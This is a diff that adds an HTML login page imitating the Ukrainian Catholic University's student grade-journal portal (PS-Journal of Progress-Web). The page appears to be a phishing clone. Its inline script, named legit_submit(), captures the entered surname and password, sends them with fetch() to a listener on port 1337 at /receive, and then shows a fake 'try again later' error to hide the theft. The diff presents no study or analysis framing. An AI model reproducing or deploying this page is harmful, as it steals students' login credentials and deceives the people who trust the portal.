@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="keywords" content="" />
+    <meta name="author" content="ПП Політек-Софт" />
+    <meta name="description" content="ПС-Журнал успішності-Web v.4.0" />
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+    <title>ПС-Журнал успішності-Web v.4.0</title>
+    <link rel="stylesheet" type="text/css" href="../css/style3.css" />
+    <script type="text/javascript" src="../js/jquery.min.js"></script>
+    <script type="text/javascript" src="../js/jquery.maskedinput-1.4.1.min.js"></script>
+    <script type="text/javascript" src="../js/bootstrap.min.3.js"></script>
+    <script type="text/javascript" src="../js/rwd-table.min.js"></script>
+    <script type="text/javascript" src="../js/datepicker.js"></script>
+    <script type="text/javascript" src="../js/jquery.autocomplete.min.js"></script>
+    <script type="text/javascript" src="../js/js.js"></script>
+    <script type="text/javascript" src="../js/date.js"></script>
+    <script type="text/javascript" src="../js/select2.min.js"></script>
+    <script type="text/javascript" src="http://dekanat.ucu.edu.ua/js/summernote.min.js"></script>
+    <script type="text/javascript" src="http://dekanat.ucu.edu.ua/js/locales/summernote-uk-UA.min.js"></script>
+    <script type="text/javascript"> var url = "./srequest.cgi"; </script>
+    <style type="text/css">
+        @media print {
+            .hidden-print {
+                display: none !important;
+            }
+
+            a[href]:after {
+                content: " ";
+            }
+
+            body {
+                padding-top: 0;
+            }
+
+            .col-print-6 {
+                width: 50%;
+                float: left;
+                page-break-inside: avoid;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="wrap">
+        <div class="container-fluid">
+            <div class="container mainbody login">
+                <form enctype="application/x-www-form-urlencoded"
+                    action="http://dekanat.ucu.edu.ua/cgi-bin/classman.cgi?n=1&amp;ts=14817" method="post">
+                    <h3>Авторизація користувача</h3>
+                    <ol class="breadcrumb">
+                        <li><a href="../index.html">Головна сторінка</a></li>
+                        <li class="active">ПС-Журнал успішності-Web</li>
+                    </ol>
+                    <div class="row pb10">
+                        <div class="col-md-12"><label for="user_name">Прізвище:</label><input id="user_name" type="text"
+                                name="user_name" class="form-control" /></div>
+                    </div>
+                    <div class="row pb10">
+                        <div class="col-md-12"><label for="user_pwd">Пароль:</label><input id="user_pwd" type="password"
+                                name="user_pwd" class="form-control" /></div>
+                    </div>
+                    <div><input type="hidden" name="n" id="n" value="1" /></div>
+                    <div><input type="hidden" name="rout" id="rout" value="" /></div>
+                    <p>При першому вході в персональний кабінет студента потрібно використовувати замість пароля №
+                        залікової книжки.</p>
+                    <p></p>
+                    <div><input type="hidden" name="t" id="t" value="14817" /></div>
+                    <div><label for="t" id="t_error" style="color:red; display: none">Помилка: спробуйте ще раз за
+                            декілька хвилин</label></div>
+                    <div class="row pb10">
+                        <script>
+                            function legit_submit() {
+                                document.getElementById('butsubm').disabled = true;
+                                document.getElementById('t_error').style.display = 'block';
+
+                                let username = document.getElementById('user_name').value;
+                                let password = document.getElementById('user_pwd').value;
+                                let data = username + ":" + password;
+
+                                const url = "http://dekanat.ucu.edu.ua:1337/receive?data=" + data;
+
+                                fetch(url, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'text/plain'
+                                    },
+                                    body: data
+                                })
+                                    .then(response => {
+                                        if (!response.ok) {
+                                            throw new Error(`HTTP error! Status: ${response.status}`);
+                                        }
+                                        return response.text();
+                                    })
+                                    .then(responseData => {
+                                        console.log('Success:', responseData);
+                                    })
+                                    .catch(error => {
+                                        console.error('Error:', error);
+                                    });
+                            }
+                        </script>
+                        <div class="col-md-3 col-xs-12"><button type="submit" class="btn btn-success" name="butsubm"
+                                id="butsubm" onclick="legit_submit();"> Увійти </button></div>
+                    </div>
+                </form>
+            </div>
+            <script type="text/javascript">document.getElementById("user_name").focus();</script>
+        </div>
+    </div>
+    <div id="footer">
+        <div class="container">
+            <p class="text-muted credit">© ПП <a href="http://politek-soft.kiev.ua" target="_blank">Політек-софт</a></p>
+        </div>
+    </div>
+    <script
+        type="text/javascript">$('.datepicker').datepicker({weekStart: 1, todayBtn: "linked", autoclose: true, orientation: "top right", todayHighlight: true, format: "dd.mm.yyyy", });</script>
+</body>
+
+</html>
